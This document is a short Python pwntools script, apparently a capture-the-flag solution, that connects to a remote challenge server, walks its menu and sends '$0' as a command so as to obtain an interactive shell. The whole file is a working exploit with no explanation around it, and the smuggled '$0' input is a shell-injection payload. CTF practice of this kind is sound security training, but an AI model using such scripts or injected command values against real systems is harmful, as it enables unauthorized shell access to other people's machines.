from pwn import *

p = remote("europe.pwn.zh3r0.ml", 8520)
p.recvuntil("name: ")
p.sendline("A")
p.recvuntil("> ")
p.sendline(str(1))
p.recvuntil("> ")
p.sendline("$0") # current command - shell
p.recvuntil("> ")
p.sendline(str(2))
p.recvuntil("index of the command: ")
p.sendline(str(0))
p.interactive()
p.close()
